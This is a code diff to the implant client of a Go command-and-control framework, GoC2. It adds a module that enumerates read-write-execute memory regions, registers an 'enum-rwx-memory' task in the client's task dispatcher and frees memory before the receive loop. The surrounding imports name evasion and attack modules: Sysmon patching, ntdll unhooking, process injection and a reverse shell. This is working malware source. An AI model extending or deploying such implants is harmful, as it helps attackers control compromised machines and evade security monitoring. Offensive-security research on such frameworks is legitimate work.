@@ -13,6 +13,7 @@ import (
 	"os"
 	"os/signal"
 	"runtime"
+	"runtime/debug"
 	"strconv"
 	"time"
 
@@ -37,6 +38,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/evasion/patchsysmon"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/unhookntdll"
 	"github.com/latortuga71/GoC2/internal/modules/execution/createprocess"
+	"github.com/latortuga71/GoC2/internal/modules/execution/enumrwxmemory"
 	"github.com/latortuga71/GoC2/internal/modules/execution/memfdcreate"
 	"github.com/latortuga71/GoC2/internal/modules/execution/processinjection"
 	"github.com/latortuga71/GoC2/internal/modules/execution/reverseshell"
@@ -327,6 +329,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = enumdrivers.EnumerateDrivers()
 	case "enum-modules":
 		result, cmdError = enummodules.EnumProcessModules(t.Args[0])
+	case "enum-rwx-memory":
+		result, cmdError = enumrwxmemory.EnumMemory()
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
@@ -519,6 +523,7 @@ func ClientDoCheckIn(client *data.Client) error {
 func ClientReceiveHandler(client *data.Client) {
 	//https://morsmachine.dk/go-scheduler
 	// locking thread to keep thread impersonations working.
+	debug.FreeOSMemory()
 	runtime.LockOSThread()
 	connection := client.WSConn
 	for {
